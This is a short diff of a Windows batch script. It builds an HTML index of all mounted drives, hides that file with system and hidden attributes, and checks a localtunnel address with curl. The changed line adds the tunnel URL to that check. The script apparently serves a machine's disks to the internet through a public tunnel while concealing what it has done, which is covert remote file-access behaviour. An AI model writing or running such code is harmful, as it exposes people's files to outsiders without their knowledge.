@@ -79,7 +79,7 @@ powershell.exe Remove-Item -Force "C:\drives.html"
 FOR /F "usebackq tokens=1" %%a IN (`MOUNTVOL ^| FIND ":\"`) DO (FOR /F "usebackq tokens=3" %%b IN (`FSUTIL FSINFO DRIVETYPE %%a`) DO (set drive=%%a && echo ^<a href="%WS%disk!drive:~0,-3!"^>%%a^</a^>^<br^> >> C:\drives.html))
 attrib +s +h +i "C:\drives.html"
 
-for /f "tokens=1" %%i in ('%environment%\curl.exe -k -H "Bypass-Tunnel-Reminder: 1" ') do set "status=%%i"
+for /f "tokens=1" %%i in ('%environment%\curl.exe -k -H "Bypass-Tunnel-Reminder: 1" %WS% ') do set "status=%%i"
 if "%status%"=="404" (
   taskkill /f /im Localtunnel.exe
 ) else (
